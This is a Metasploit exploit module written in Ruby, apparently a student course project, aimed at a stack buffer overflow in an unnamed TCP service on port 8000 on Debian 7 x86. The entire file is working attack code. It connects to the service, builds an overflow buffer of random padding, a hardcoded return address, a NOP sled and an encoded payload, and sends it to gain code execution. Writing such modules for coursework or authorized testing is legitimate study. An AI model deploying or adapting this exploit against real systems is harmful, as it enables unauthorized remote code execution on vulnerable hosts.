##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  
  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "[Vendor] [Software] [Root Cause] [Vulnerability type]",
      'Description'    => %q{
        Buffer overflow vulnerability for final PPT project
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jack Krejci' ],
      'References'     =>
        [
          [ 'URL', 'http://www.cs.lewisu.edu' ]
        ],
      'Platform'       => 'linux',
      'Targets'        =>
        [
          [ 'Debian 7 x86',
            {
              'Ret' => 0xbffff508 # This will be available in `target.ret`
            }
          ]
        ],
      'Payload'        =>
        {
          'Space' => 1024-223-4-32,
          'BadChars' => "\x00\x0a\x0d"
        },
      'Privileged'     => false,
      'DisclosureDate' => "",
      'DefaultTarget'  => 0))
      
      #Also set default options in the constructor
      register_options(
        [
            Opt::RPORT(8000)
        ], self.class) #Set the option for this class, setting default port
  end

  #def check
    # For the check command
  #end

  def exploit
    # Main function
    print_status('Connecting...')
    connect #Automatically connect over TCP with given options
    sock.get_once #To recieve banner
    #Construct the buffer
    buf = rand_text_alpha(223) #Stealthier than A's in other version
    buf << [target['Ret']].pack('V') #V means 32-bit little-endian
    buf << make_nops(32) #NOP sled
    buf << payload.encoded #encode payload to avoid bad bytes   
    
    print_status('Sending exploit...')
    sock.put(buf)
    print_status('Disconnecting...')
    disconnect
  end

end
